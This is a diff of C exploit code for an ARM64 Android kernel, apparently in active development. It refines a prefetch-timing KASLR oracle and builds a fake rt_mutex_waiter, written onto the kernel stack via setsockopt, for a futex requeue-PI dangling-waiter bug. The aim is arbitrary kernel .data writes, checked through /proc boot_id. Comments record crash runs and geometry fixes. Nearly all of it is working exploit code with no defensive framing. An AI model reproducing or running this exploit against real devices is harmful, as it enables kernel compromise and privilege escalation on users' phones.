@@ -10,10 +10,6 @@
 #define SLIDE_MAX_ATTEMPTS 20
 #define SLIDE_CONSUME_DELAY 2000
 #define SLIDE_CONSUME_USEC 0
-#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
-#define SLIDE_PSELECT_PAD_BYTES 0
-#define SLIDE_PSELECT_WORD_SHIFT 0
-#define SLIDE_WAIT_SECONDS 30
 
 /* ---------------- setsockopt-MCAST stamp overlay (z3q stack geometry) ----
  * The waiter (do_futex inlined rt_waiter) sits at SP0-0x190. The
@@ -22,14 +18,22 @@
  * chain depth SP0-0x250 (sys_setsockopt 0x50 + springboard 0x10 +
  * sock_common_setsockopt 0x10 + springboard 0x10 + udp_setsockopt 0x10 +
  * ip_setsockopt 0x30 + do_ip_setsockopt 0x190), so the gsr lands at
- * SP0-0x230 and the waiter's fields are gsr+0x40..0x98 — ALL inside the
+ * SP0-0x230 and the waiter's fields are gsr+0xa0..0xe8 — ALL inside the
  * fully-controlled copy (the family/port validation happens AFTER the
  * copy and its EINVAL return is irrelevant to the stamp).
+ *
+ * All frame sizes and both copy sites are disasm-verified against the
+ * shipped vmlinux (out/vmlinux): __arm64_sys_futex 0x70 + do_futex 0x1e0
+ * with the inlined rt_waiter at sp+0xc0 ("add x28, sp, #0xc0"); the gsr
+ * copy is "add x0, sp, #0x20; mov w2, #0x108; bl __arch_copy_from_user"
+ * in do_ip_setsockopt. waiter - gsr = (SP0-0x190) - (SP0-0x230) = 0xa0
+ * (the old 0x40 table planted 0x60 above the waiter and never stamped
+ * it).
  *
  * The pselect overlay cannot work on this build: its fd_set buffers span
  * [SP0-0x210, SP0-0x138) but only the first 15 qwords are user-controlled,
  * ending 8 bytes ABOVE the waiter's tree_entry. */
-#define STAMP_GSR_WAITER_OFF 0x40
+#define STAMP_GSR_WAITER_OFF 0xa0
 #define STAMP_BUF_SZ 264
 #define STAMP_ROUNDS 200000
 
@@ -53,6 +57,21 @@ static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
+/* per-fire slide hypothesis delta in 2MB units (set by the consumer
+ * before each sched_setattr; the stamp loop re-plants with it). The
+ * oracle's answer proved to place the mirror on a zeroed .bss page (the
+ * walk's trylock succeeds every time) but W1 never lands in the boot_id
+ * slot — the mirror-in-.bss geometry pins the true slide to
+ * {guess-2MB, guess, guess+2MB}, so the fires sweep those three. */
+static atomic_int slide_fire_k;
+/* while set, the stamp loop stops issuing setsockopt and spins in
+ * userspace: the planted waiter fields are RESIDENT (the waiter thread
+ * is parked in pause() whose frames stay above the region), so the
+ * walk triggered by the consumer's sched_setattr reads one consistent
+ * planted set instead of racing the 264-byte copy (runs 19-27: ~1/3 of
+ * fires panicked from mid-copy torn reads — those panics carry no
+ * information about the slide hypothesis under test). */
+static atomic_int slide_stamp_hold;
 static char slide_stock_bootid[64];
 static int slide_stock_bootid_len;
 static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */
@@ -69,67 +88,186 @@ static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */
  * exactly one candidate cluster; its first slot is the image base.
  * Zero crash risk: PRFM is a non-faulting hint. (tools/prefetch_probe.c is
  * the standalone twin of this code.) */
-static uint64_t slide_prefetch_time(uint64_t va)
+/* Single-shot first-touch timing: ONE 64-PRFM burst, no retries. A
+ * retry loop self-installs the TLB entry on the first burst (speculative
+ * walk) and then measures its own install as "hot" — best-of-N timing
+ * degenerates into a *mapped-ness* oracle, and the vmalloc region below
+ * the image is heavily mapped, so the "lowest hot trio" rule returned a
+ * vmalloc window instead of the image base. First-touch timing cannot
+ * false-ACCEPT (a walk costs >= 14 ticks); it can only false-reject
+ * (interrupt hiccup), which the outer per-core/per-round retries absorb.
+ * The three anchor grids (+0x2000 / +0x1980000 / +0x2c07000 at 2MB
+ * steps) are mutually disjoint (their pairwise deltas are not 2MB
+ * multiples), so a single scan touches each page exactly once and never
+ * warms another hypothesis's anchor. */
+static uint64_t slide_prefetch_first(uint64_t va)
 {
-    uint64_t best = ~0ULL;
-    for (int r = 0; r < 4; r++) {
-        uint64_t t0, t1;
-        asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t0));
-        for (int i = 0; i < 64; i++)
-            asm volatile("prfm pldl1keep, [%0]" :: "r"(va) : "memory");
-        asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t1));
-        if (t1 - t0 < best)
-            best = t1 - t0;
+    uint64_t t0, t1;
+    asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t0));
+    for (int i = 0; i < 64; i++)
+        asm volatile("prfm pldl1keep, [%0]" :: "r"(va) : "memory");
+    asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t1));
+    return t1 - t0;
+}
+
+/* Tolerant pin: hotplug-offline big cores fail with EINVAL — skip them
+ * instead of dying (SYSCHK-pin would exit the whole process). */
+static int slide_try_pin_core(size_t core)
+{
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+    return sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0;
+}
+
+/* Burn cycles for a couple of seconds so the scheduler hotplugs the big
+ * cluster online (the A55 cluster's TLB never serves EL0 prefetches from
+ * kernel image entries; the A77 cluster does). */
+static void *slide_hotplug_spinner(void *arg __attribute__((unused)))
+{
+    struct timespec deadline;
+    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &deadline));
+    deadline.tv_sec += 3;
+    for (;;) {
+        struct timespec now;
+        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
+        if (now.tv_sec > deadline.tv_sec ||
+            (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
+            return NULL;
+        }
+        for (int i = 0; i < 100000; i++) {
+            __asm__ volatile("nop");
+        }
     }
-    return best;
+}
+
+static void slide_wake_big_clusters(void)
+{
+    pthread_t th[8];
+    int n = (int)(sizeof(th) / sizeof(th[0]));
+    for (int i = 0; i < n; i++) {
+        if (pthread_create(&th[i], NULL, slide_hotplug_spinner, NULL) != 0) {
+            n = i;
+            break;
+        }
+    }
+    for (int i = 0; i < n; i++) {
+        pthread_join(th[i], NULL);
+    }
+}
+
+/* Grid-A scan on the CURRENT core. Returns the image base VA or ~0.
+ *
+ * The anchor is the exception-vectors page: every interrupt AND every
+ * syscall i-fetches the vectors at image_base+0x2000, so on a core that
+ * executes anything, that page is TLB-resident. The scan does its own
+ * syscalls (getpid) before and during the sweep to keep the vectors page
+ * AND the sys_call_table page (image_base+0x1980000, read by every
+ * syscall) AND the jiffies page (image_base+0x2c07000 — the TRUE jiffies
+ * link VA is 0xffffff800ac07180; the old 0x2b87000 anchor probed a page
+ * 0x80180 away whose hotness tracked system activity, not the tick —
+ * the oracle "succeeded" on busy boots and went blind on idle ones
+ * without ever validating jiffies). A pinned, running core takes its
+ * tick, so the true jiffies page is always TLB-hot on the probing core.
+ * syscall) hot on the probing core — an idle phone suspend-cycles and
+ * flushes the TLB, so a silent sweep measures nothing (run 13).
+ *
+ * The rule: the LOWEST 2MB slot whose +0x2000, +0x1980000 and +0x2c07000
+ * pages all pass a FIRST-TOUCH timing (< 10 ticks, no retry — see
+ * slide_prefetch_first) is the image base: only the TRUE hypothesis's
+ * trio is naturally TLB-hot on a syscall-issuing, tick-taking core
+ * (vectors + sys_call_table warmed by our own getpid, jiffies by the
+ * local tick); everything else is cold before its first probe and a
+ * walk costs >= 14 ticks. The three anchor grids are mutually disjoint,
+ * so the scan touches each page exactly once and cannot warm another
+ * hypothesis's anchor. */
+static uint64_t slide_scan_image_base(void)
+{
+    const uint64_t link = KIMAGE_TEXT_BASE;
+    /* absolute VA cap: keep an image-size margin below the linear map
+     * base (compare against va itself, which is an absolute VA — the
+     * earlier PO-link-0x4200000 form computed a LENGTH and the loop
+     * folded to dead code, every scan "saw nothing") */
+    const uint64_t limit = 0xffffffc000000000ULL - 0x4200000ULL;
+    for (int i = 0; i < 32; i++) {
+        (void)getpid();
+    }
+    uint64_t probed = 0;
+    for (uint64_t va = link; va < limit; va += 0x200000ULL) {
+        if ((++probed & 0x3f) == 0) {
+            (void)getpid();
+        }
+        uint64_t tv = slide_prefetch_first(va + 0x2000ULL);
+        if (tv < 10) {
+            uint64_t ts = slide_prefetch_first(va + 0x1980000ULL);
+            uint64_t tj = slide_prefetch_first(va + 0x2c07000ULL);
+            if (ts < 10 && tj < 10) {
+                pr_info("slide oracle trio va=%016llx t_vec=%llu t_sct=%llu "
+                        "t_jif=%llu\n",
+                        (unsigned long long)va,
+                        (unsigned long long)tv, (unsigned long long)ts,
+                        (unsigned long long)tj);
+                return va;
+            }
+        }
+    }
+    return ~0ULL;
 }
 
 static uint64_t slide_oracle_find_slide(void)
 {
-    /* The image link base (0xffffff8008080000) is NOT 2MB-aligned — it sits
-     * 0x80000 into its 2MB block — and the slide is 2MB-aligned, so the
-     * runtime image base keeps that misalignment. The probe grid is
-     * link + SYS_CALL_TABLE_PAGE + s*2MB: sys_call_table is rodata read on
-     * every syscall, so its page is DTLB-hot on any active system. (A data
-     * prefetch is required: the exception-vectors page is instruction-only
-     * and stays cold in the DTLB on this split-TLB core.) Each probe tests
-     * exactly one slide hypothesis. */
-    const uint64_t link = KIMAGE_TEXT_BASE;
-    const uint64_t sct_page = 0x1980000ULL;  /* sys_call_table link page */
-    const uint64_t jif_page = 0x2b87000ULL;  /* jiffies link page, read every tick */
-    const uint64_t span = 0xffffffc000000000ULL - 0xffffff8000000000ULL;
-    int nslots = (int)(span >> 21);
-    uint64_t found = ~0ULL;
-    int hits = 0;
-    for (uint64_t s = 0; s < (uint64_t)nslots; s++) {
-        uint64_t t = slide_prefetch_time(link + sct_page + s * 0x200000ULL);
-        if (t < 10) {
-            /* candidate: module-region pages also light up, so require the
-             * jiffies page of the SAME hypothesis to be hot too */
-            uint64_t tj = slide_prefetch_time(link + jif_page + s * 0x200000ULL);
-            if (tj < 10) {
-                if (found == ~0ULL)
-                    found = s * 0x200000ULL;
-                hits++;
+    /* Grid-A image-base rule (run-11..13 lessons): probe the +0x2000 page
+     * of every 2MB slot (link + s*2MB + 0x2000) — the exception-vectors
+     * page of each slide hypothesis. The vectors page is i-fetched on
+     * every interrupt and every syscall, so the TRUE hypothesis's page is
+     * TLB-resident on any active core; the scan keeps it (and the
+     * sys_call_table / jiffies anchor pages) warm with its own getpid()
+     * traffic. Grid-A VAs below the image land in the empty vmalloc gap
+     * and read cold, so the LOWEST hot slot IS the image base. The old
+     * grid-B rule (sys_call_table + jiffies pages, lowest dual-confirmed)
+     * mis-fired twice: on run-11's boot a coincidental in-image pair at
+     * s=0 beat the true slide 0x200000, and every planted VA being 2MB
+     * off made the erase walk fault at its first deref of the "mirror";
+     * and a silent full-span sweep on an idle (suspend-cycling) system
+     * measures everything cold.
+     *
+     * TLB visibility is also per-cluster and hotplug-dependent: on this
+     * device the A55 cluster serves EL0 prefetches from kernel entries
+     * while an idle A77 often does not, and the big cores hotplug-off at
+     * idle — so skip unpinnable cores, and if no online core sees the
+     * anchors, spin for a few seconds to force the big cluster online
+     * and retry. */
+    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpu < 1) {
+        ncpu = 1;
+    }
+    for (int round = 0; round < 4; round++) {
+        if (round > 0) {
+            pr_info("slide oracle: waking the big cluster (round %d)\n",
+                    round);
+            slide_wake_big_clusters();
+        }
+        for (int core = 0; core < ncpu; core++) {
+            if (!slide_try_pin_core((size_t)core)) {
+                pr_info("slide oracle: core %d offline\n", core);
+                continue;
             }
+            uint64_t base = slide_scan_image_base();
+            if (base == ~0ULL) {
+                pr_info("slide oracle: core %d sees no image cluster\n", core);
+                continue;
+            }
+            uint64_t slide = base - KIMAGE_TEXT_BASE;
+            pr_success("slide oracle: slide=%016llx base=%016llx core=%d\n",
+                       (unsigned long long)slide, (unsigned long long)base,
+                       core);
+            pin_to_core(CORE);
+            return slide;
         }
     }
-    /* second pass to drop transient false positives */
-    if (found != ~0ULL) {
-        uint64_t t = slide_prefetch_time(link + sct_page + found);
-        if (t >= 10) {
-            pr_warning("slide oracle: candidate lost on re-probe, no slide\n");
-            return ~0ULL;
-        }
-    }
-    if (found == ~0ULL) {
-        pr_warning("slide oracle: no hot slot found\n");
-        return ~0ULL;
-    }
-    pr_success("slide oracle: slide=%016llx hot=%d recheck=%llu\n",
-               (unsigned long long)found, hits,
-               (unsigned long long)slide_prefetch_time(link + sct_page + found));
-    return found;
+    pin_to_core(CORE);
+    pr_warning("slide oracle: no core saw a 3-hot image base cluster\n");
+    return ~0ULL;
 }
 
 static void slide_capture_stock_bootid(void) {
@@ -149,34 +287,62 @@ static void slide_capture_stock_bootid(void) {
     slide_stock_bootid[--n] = 0;
   }
   slide_stock_bootid_len = (int)n;
-  pr_info("slide stock boot_id captured len=%d\n", n);
+  pr_info("slide stock boot_id captured len=%zd\n", n);
+}
+
+/* Rebuild the planted waiter fields for one slide hypothesis. k is in
+ * 2MB units relative to the oracle's slide. Only the W1/W2 targets
+ * (C = boot_id slot, P = loggers) ride the sweep: the mirror is pinned
+ * to the oracle's slide because ANY zeroed .bss page works as the fake
+ * rt_mutex (0xc2f0000 verified zeroed every boot), while a swept mirror
+ * walks off the image tail and trylocks unmapped/module memory (run 25:
+ * k=4's mirror faulted before the erase). */
+static void slide_stamp_build(int k) {
+  uint64_t sweep = slide_slide + (uint64_t)(int64_t)k * 0x200000ULL;
+  /* P = the leak pair the boot_id readback will serve (see
+   * SLIDE_READ_PAIR_OFF in target.h): the qword pair below the
+   * boot_id entry's .data slot — q1 = the "boot_id" procname pointer
+   * (link 0xffffff800a209a37 + slide), so the readback leaks the
+   * slide directly. Other P candidates fail: &loggers[0][0] has a
+   * zero byte 8 at runtime (proc_do_uuid regenerates instead of
+   * serving, run 36), linux_banner is .rodata (W2's *(P+8)=C write
+   * faults read-only, run 37), and the boot_id entry's own
+   * proc_handler slot must never be P (W2 would corrupt it and the
+   * next sysctl read would call a data address as a function). */
+  uint64_t leak_p = SLIDE_READ_PAIR_IMAGE + sweep;
+  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + sweep;
+  uint64_t mirror = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
+  /* waiter->task: the [9]-exit wake_up_process(W->task) — a zeroed
+   * .bss VA is the only choice safe for EVERY slide hypothesis (a
+   * garbage .data "task" hangs ttwu on its pi_lock, run 28; the real
+   * init_task works only at the true slide). On a zeroed page
+   * state==TASK_RUNNING so ttwu returns immediately. */
+  uint64_t fake_task = mirror + 8;
+
+  /* waiter field F lives at gsr + (STAMP_GSR_WAITER_OFF + F) */
+  uint64_t *q = (uint64_t *)(slide_stamp_buf + STAMP_GSR_WAITER_OFF);
+  q[0] = leak_p;              /* tree_entry.rb_parent_color = P (W1 value) */
+  q[1] = 0;                   /* tree_entry.rb_right = NULL (simple path) */
+  q[2] = bootid_data;         /* tree_entry.rb_left = C (W1 target) */
+  q[3] = leak_p;              /* pi_tree_entry.rb_parent_color */
+  q[4] = 0;                   /* pi_tree_entry.rb_right */
+  q[5] = bootid_data;         /* pi_tree_entry.rb_left */
+  q[6] = fake_task;           /* waiter->task: zeroed page, wake-safe */
+  q[7] = mirror;              /* waiter->lock (all-zero rt_mutex, walkable) */
+  q[8] = 130;                 /* waiter->prio: never equals a nice-class
+                                 task prio (120..129) so every fire walks */
+  q[9] = 0;                   /* waiter->deadline */
 }
 
 static void slide_stamp_prepare(void) {
   memset(slide_stamp_buf, 0, sizeof(slide_stamp_buf));
-
-  uint64_t loggers = SLIDE_LOGGERS_0_1_IMAGE + slide_slide;
-  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide;
-  uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
-  uint64_t mirror = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
-
-  /* waiter field F lives at gsr + (STAMP_GSR_WAITER_OFF + F) */
-  uint64_t *q = (uint64_t *)(slide_stamp_buf + STAMP_GSR_WAITER_OFF);
-  q[0] = loggers;             /* tree_entry.rb_parent_color = P (W1 value) */
-  q[1] = 0;                   /* tree_entry.rb_right = NULL (simple path) */
-  q[2] = bootid_data;         /* tree_entry.rb_left = C (W1 target) */
-  q[3] = loggers;             /* pi_tree_entry.rb_parent_color */
-  q[4] = 0;                   /* pi_tree_entry.rb_right */
-  q[5] = bootid_data;         /* pi_tree_entry.rb_left */
-  q[6] = init_task;           /* waiter->task (real struct, walkable) */
-  q[7] = mirror;              /* waiter->lock (all-zero rt_mutex, walkable) */
-  q[8] = FAKE_WAITER_PRIO;    /* waiter->prio */
-  q[9] = 0;                   /* waiter->deadline */
-
-  pr_info("slide stamp: loggers=%016llx bootid_data=%016llx task=%016llx "
+  slide_stamp_build(0);
+  pr_info("slide stamp: leak_p=%016llx bootid_data=%016llx task=%016llx "
           "lock=%016llx\n",
-          (unsigned long long)loggers, (unsigned long long)bootid_data,
-          (unsigned long long)init_task, (unsigned long long)mirror);
+          (unsigned long long)(SLIDE_READ_PAIR_IMAGE + slide_slide),
+          (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide),
+          (unsigned long long)(SLIDE_INIT_TASK_IMAGE + slide_slide),
+          (unsigned long long)(SLIDE_MIRROR_LOCK_IMAGE + slide_slide));
 
   slide_stamp_fd = socket(AF_INET, SOCK_DGRAM, 0);
   if (slide_stamp_fd < 0) {
@@ -188,198 +354,17 @@ static void slide_stamp_once(void) {
   if (slide_stamp_fd < 0) {
     return;
   }
+  slide_stamp_build(atomic_load(&slide_fire_k));
   setsockopt(slide_stamp_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
              slide_stamp_buf, STAMP_BUF_SZ);
 }
 
-int slide_pselect_words_per_set(void) {
-  int bits_per_word = (int)(8 * sizeof(unsigned long));
-  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
-}
-
-int slide_pselect_global_word(int waiter_word) {
-  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
-}
-
-int slide_pselect_put_global_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int global_word, uint64_t value) {
-  if (global_word < 0) {
-    return 0;
+/* spin without syscalls: the last planted copy stays resident on the
+ * waiter's kernel stack until the next setsockopt overwrites it */
+static void slide_stamp_halt(void) {
+  while (atomic_load(&slide_stamp_hold)) {
+    __asm__ volatile("yield" ::: "memory");
   }
-
-  int set_idx = global_word / words_per_set;
-  int word_idx = global_word % words_per_set;
-  switch (set_idx) {
-    case 0:
-      fdset_put_word(in, word_idx, value);
-      return 1;
-    case 1:
-      fdset_put_word(out, word_idx, value);
-      return 1;
-    case 2:
-      fdset_put_word(ex, word_idx, value);
-      return 1;
-    default:
-      return 0;
-  }
-}
-
-uint64_t slide_pselect_get_global_word(
-    const fd_set *in, const fd_set *out, const fd_set *ex,
-    int words_per_set, int global_word) {
-  if (global_word < 0) {
-    return 0;
-  }
-
-  int set_idx = global_word / words_per_set;
-  int word_idx = global_word % words_per_set;
-  switch (set_idx) {
-    case 0:
-      return fdset_get_word(in, word_idx);
-    case 1:
-      return fdset_get_word(out, word_idx);
-    case 2:
-      return fdset_get_word(ex, word_idx);
-    default:
-      return 0;
-  }
-}
-
-void slide_pselect_put_waiter_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int waiter_word, uint64_t value, const char *name) {
-  int global_word = slide_pselect_global_word(waiter_word);
-  int placed = slide_pselect_put_global_word(
-      in, out, ex, words_per_set, global_word, value);
-  if (!placed) {
-    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
-               "words_per_set=%d nfds=%d\n",
-               name, waiter_word, global_word, words_per_set,
-               SLIDE_PSELECT_NFDS);
-  }
-}
-
-
-
-void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
-  FD_ZERO(in);
-  FD_ZERO(out);
-  FD_ZERO(ex);
-
-  uint64_t loggers = SLIDE_LOGGERS_0_1_IMAGE + slide_slide;
-  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide;
-  uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
-  uint64_t mirror_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
-
-  /* z3q stack geometry, disasm-derived (see PORTING.md §7):
-   *   waiter (do_futex rt_waiter @SP0-0x190) - pselect fd buf (@SP0-0x210)
-   *   = DELTA 0x80, so waiter field F = fdset word (0x80+F)/8.
-   *   tree_entry.parent_color = word 10, .rb_right = 11, .rb_left = 12;
-   *   pi_tree_entry.parent_color = 13, .rb_right = 14; pi .rb_left = 15
-   *   (res_out region: kernel-zeroed, pi erase takes the no-child path).
-   *   task/lock sit past the plantable window in res_ex — do not plant.
-   * The old k40 table put wake_state(3) on word 13 = pi_tree
-   * parent_color: the pi erase then read [0x13] and panicked the boot
-   * (runs 1-8, the final unknown failure). */
-  int words_per_set = slide_pselect_words_per_set();
-  struct slide_waiter_word {
-    int word;
-    uint64_t value;
-    const char *name;
-  } words[] = {
-    {10, loggers, "tree_pc"},
-    {11, 0, "tree_right"},
-    {12, bootid_data, "tree_left"},
-    {13, loggers, "pi_pc"},
-    {14, 0, "pi_right"},
-  };
-  (void)init_task;
-  (void)mirror_lock;
-  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
-    struct slide_waiter_word *w = &words[i];
-    slide_pselect_put_waiter_word(
-        in, out, ex, words_per_set, w->word, w->value, w->name);
-  }
-}
-
-void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
-  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
-    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
-      dup2(read_fd, fd);
-    }
-  }
-  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
-  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
-}
-
-void slide_pselect_stack_copy(void) {
-  if (!page_base || !fake_lock || !fake_w0) {
-    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
-             page_base, fake_lock, fake_w0);
-    return;
-  }
-
-  int pipefd[2] = {-1, -1};
-  SYSCHK(pipe(pipefd));
-  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-  if (block_fd < 0) {
-    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
-               errno);
-    block_fd = pipefd[0];
-  }
-  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
-  if (high_read < 0) {
-    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
-    if (block_fd != pipefd[0]) {
-      close(block_fd);
-    }
-    close(pipefd[0]);
-    close(pipefd[1]);
-    return;
-  }
-
-  fd_set in;
-  fd_set out;
-  fd_set ex;
-  prepare_slide_pselect_fdsets(&in, &out, &ex);
-  open_slide_selected_fds(&in, &out, &ex, high_read);
-
-  atomic_store(&slide_consume_stop, 0);
-  atomic_store(&slide_consume_go, 0);
-  atomic_store(&slide_consume_seen, 0);
-  atomic_store(&slide_consume_lost, 0);
-  atomic_store(&slide_consume_enter_sched, 0);
-  atomic_store(&slide_consume_calls, 0);
-  atomic_store(&slide_consume_sched_ok, 0);
-  atomic_store(&slide_consume_last_sched_ret, -1);
-  atomic_store(&slide_consume_last_sched_errno, 0);
-
-  struct timespec timeout = {
-    .tv_sec = PSELECT_TIMEOUT_SEC,
-    .tv_nsec = 0,
-  };
-  struct timespec *timeoutp = &timeout;
-
-  atomic_store(&slide_consume_go, 1);
-  errno = 0;
-
-  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
-  int saved_errno = errno;
-  atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d\n",
-          ret, saved_errno, atomic_load(&slide_consume_calls),
-          atomic_load(&slide_consume_sched_ok),
-          atomic_load(&slide_consume_last_sched_ret),
-          atomic_load(&slide_consume_last_sched_errno));
-
-  close(high_read);
-  if (block_fd != pipefd[0]) {
-    close(block_fd);
-  }
-  close(pipefd[0]);
-  close(pipefd[1]);
 }
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
@@ -417,18 +402,85 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     }
 
     int tid = atomic_load(&slide_waiter_tid);
-    int calls = atomic_load(&slide_consume_calls);
-    int entered = atomic_load(&slide_consume_enter_sched) + 1;
-    atomic_store(&slide_consume_enter_sched, entered);
-    atomic_store(&slide_consume_calls, calls + 1);
-    errno = 0;
-    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
-    int saved_errno = errno;
-    atomic_store(&slide_consume_last_sched_ret, (int)ret);
-    atomic_store(&slide_consume_last_sched_errno, saved_errno);
-    if (ret == 0) {
-      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
-      atomic_store(&slide_consume_sched_ok, sched_ok);
+    /* ONE fire per boot: the walk's pi-tree erase uses the planted
+     * links, and its re-enqueue then re-links the waiter into the REAL
+     * task's pi_waiters tree with those fake links — the tree is left
+     * corrupted, so every fire after the first walks on garbage (runs
+     * 19-27's fire-2+ results are void). One virgin fire per boot, one
+     * slide hypothesis per boot; k comes from GHOSTLOCK_K so the sweep
+     * iterates without rebuilds. Post-fire order matters: the gadget
+     * writes can corrupt a live .data structure that kills THIS process
+     * on its next syscall (runs 34-35: the child died between the fire
+     * and the "ret=" log line, losing the readback) — so pre-open the
+     * boot_id fd, fire, read back FIRST (one read(2), no open, no
+     * logging), and only then write the log lines. */
+    int k = 0;
+    const char *kenv = getenv("GHOSTLOCK_K");
+    if (kenv) {
+      k = atoi(kenv);
+    }
+    int bootid_fd = open("/proc/sys/kernel/random/boot_id",
+                         O_RDONLY | O_CLOEXEC);
+    for (int f = 0; f < 1; f++) {
+      if (!atomic_load(&slide_consume_go)) {
+        break;
+      }
+      atomic_store(&slide_fire_k, k);
+      /* let the stamper re-plant with this fire's hypothesis, then
+       * freeze the copy so the walk reads one consistent field set */
+      usleep(10000);
+      atomic_store(&slide_stamp_hold, 1);
+      usleep(2000);
+      int calls = atomic_load(&slide_consume_calls);
+      atomic_store(&slide_consume_calls, calls + 1);
+      errno = 0;
+      pr_info("slide consumer sched_setattr pre tid=%d nice=0 k=%d\n",
+              tid, k);
+      long ret = sched_setattr_tid(tid, 0);
+      int saved_errno = errno;
+      /* readback BEFORE any other syscall or log write: after a
+       * successful W1 the slot stays leaked for the whole boot, so a
+       * raw compare against the stock UUID is enough here; the full
+       * stext derivation (slide_read_stext) can run later from any
+       * process if we survive. */
+      uint64_t stext = 0;
+      {
+        char buf[64];
+        ssize_t n = -1;
+        if (bootid_fd >= 0) {
+          errno = 0;
+          n = read(bootid_fd, buf, sizeof(buf) - 1);
+        }
+        if (n > 0) {
+          buf[n] = 0;
+          if (slide_stock_bootid_len > 0 &&
+              strncmp(buf, slide_stock_bootid,
+                      (size_t)slide_stock_bootid_len) == 0) {
+            /* unchanged */
+          } else {
+            stext = 1;
+            pr_success("slide CHILD CONFIRMED write landed k=%d boot_id="
+                       "%s\n",
+                       k, buf);
+          }
+        }
+      }
+      pr_info("slide consumer sched_setattr ret=%ld errno=%d\n",
+              ret, saved_errno);
+      atomic_store(&slide_consume_last_sched_ret, (int)ret);
+      atomic_store(&slide_consume_last_sched_errno, saved_errno);
+      if (ret == 0) {
+        int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
+        atomic_store(&slide_consume_sched_ok, sched_ok);
+      }
+      atomic_store(&slide_stamp_hold, 0);
+      if (stext) {
+        break;
+      }
+      usleep(20000);
+    }
+    if (bootid_fd >= 0) {
+      close(bootid_fd);
     }
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
@@ -464,30 +516,79 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_waiter_waiting, 1);
-  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
-           &slide_f_pi_target, 0);
+  errno = 0;
+  long wret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+                       &slide_f_pi_target, 0);
+  /* -ETIMEDOUT via handle_early_requeue_pi_wakeup's early path leaves
+   * pi_blocked_on dangling if the requeue already enqueued+failed us;
+   * -EWOULDBLOCK/-EAGAIN means we returned before the requeue ran (no
+   * dangle). */
+  pr_info("slide waiter futex returned ret=%ld errno=%d\n", wret, errno);
   /* Do NOT unlock f_pi_chain here: the pi chain (owner blocked on it) is
-   * what makes the requeue race leave this thread's rt_waiter dangling,
-   * and the exit-time teardown of that chain is what later erases the
-   * stamped waiter. */
+   * what makes the requeue race leave this thread's rt_waiter dangling;
+   * the waiter task keeps holding f_pi_chain so the owner stays blocked
+   * and the kernel's view of this task as a pi-chain member persists. */
 
-  /* Overlay the dangling rt_mutex_waiter on this thread's kernel stack
-   * with the MCAST gsr stamp: the setsockopt copy lands at the exact
-   * frame offsets computed from the vmlinux (see the geometry comment
-   * above). Then kill the whole child: the exit teardown walks the pi
-   * chain and erases the stamped waiter, landing the gadget write. */
+  /* Erase consumer (Q1, derived from the shipped kernel source): the
+   * requeue path's rt_mutex_start_proxy_lock gets -EDEADLK from the
+   * chain walk (owner holds f_pi_target and is blocked on f_pi_chain,
+   * which the waiter holds — a pi cycle) and calls remove_waiter(), but
+   * remove_waiter() clears *current*'s pi_blocked_on — current is the
